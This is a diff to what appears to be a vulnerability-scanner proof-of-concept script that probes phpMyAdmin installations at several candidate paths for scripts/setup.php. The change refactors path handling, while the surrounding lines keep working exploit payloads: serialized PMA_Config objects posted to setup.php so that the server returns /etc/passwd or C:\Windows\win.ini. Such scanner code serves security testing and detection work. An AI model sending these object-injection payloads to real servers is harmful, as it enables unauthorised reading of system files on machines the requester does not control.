@@ -21,19 +21,14 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './phpmyadmin/'),
-                self.url_normpath(self.base_url, '/phpmyadmin/'),
-                self.url_normpath(self.url, './pma/'),
-                self.url_normpath(self.base_url, '/pma/'),
-                self.url_normpath(self.url, './'),
-                self.url_normpath(self.url, './phpMyAdmin/'),
-                self.url_normpath(self.base_url, '/phpMyAdmin/'),
-            ]))
             headers = {"Content-Type": "application/x-www-form-urlencoded"}
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, [
+                    './phpMyAdmin/',
+                    './pma/',
+                    '/phpmyadmin/',
+                    './',
+                ]):
                     url = path + 'scripts/setup.php'
                     datas = ['action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}',
                              'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:18:"C:\\Windows\\win.ini";}']
